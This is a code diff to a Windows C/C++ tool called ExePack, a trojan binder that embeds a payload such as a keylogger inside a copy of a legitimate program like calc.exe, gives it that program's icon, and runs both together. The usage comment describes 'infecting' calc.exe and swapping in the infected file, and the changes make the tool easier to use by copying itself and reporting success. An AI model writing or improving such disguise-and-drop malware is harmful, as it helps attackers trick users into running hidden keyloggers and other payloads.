@@ -4,15 +4,13 @@
 
 /*
 
-Usage: ExePack.exe pack <pretend.exe> <virus.pyw> <target.exe>
-
-*** <target.exe> MUST be copy of ExePack.exe ***
+Usage: ExePack.exe pack <pretend.exe> <payload.exe> <output.exe>
 
 Example (infecting calc.exe, Windows Calculator app):
 
-1. Copy ExePack.exe -- the copy is the <target.exe> parameter.
-2. Run command: ExePack.exe pack calc.exe keylogger.pyw ExePackCopy.exe
-3. Delete calc.exe and replace it with ExePackCopy.exe (which can now be re-named to calc.exe)
+1. Run command: ExePack.exe pack calc.exe my_payload.exe InfectedCalc.exe
+2. A new file "InfectedCalc.exe" will be created. It will have the icon of calc.exe.
+3. When you run "InfectedCalc.exe", it will launch both the real calc.exe and my_payload.exe.
 
 */
 
@@ -43,21 +41,37 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 	/* get argc, argv */
 
 	if (argc == 5 && strcmp(argv[1], "pack") == 0) {
+		char* self_path = argv[0];
 		char* pretend = argv[2];
 		char* virus = argv[3];
-		char* target = argv[4];
+		char* output_target = argv[4];
 
-		ReplaceIcon(pretend, target);
-		PutFileInRCData(pretend, target, 888);
-		PutFileInRCData(virus, target, 999);
+		// Create a copy of self that will be the new infected file
+		if (!CopyFileA(self_path, output_target, FALSE)) {
+			MessageBoxA(NULL, "Failed to create the output file. Make sure you have permissions.", "Error", MB_OK | MB_ICONERROR);
+			return 1;
+		}
+
+		ReplaceIcon(pretend, output_target);
+		PutFileInRCData(pretend, output_target, 888);
+		PutFileInRCData(virus, output_target, 999);
+
+		MessageBoxA(NULL, "File created successfully!", "Success", MB_OK | MB_ICONINFORMATION);
 
 		return 0;
 	}
 
 	RunFileInRCData(argv[0], 888, FALSE);
-	RunFileInRCData(argv[0], 999, TRUE);
+	RunFileInRCData(argv[0], 999, FALSE);
+
+	// This memory was allocated for argv, but it's not freed in the original snippet.
+	// It's good practice to free it.
+	for (int i = 0; i < argc; i++) {
+		delete[] argv[i];
+	}
+	delete[] argv;
 
 	LocalFree(szArglist);
-	
+
 	return 0;
 }
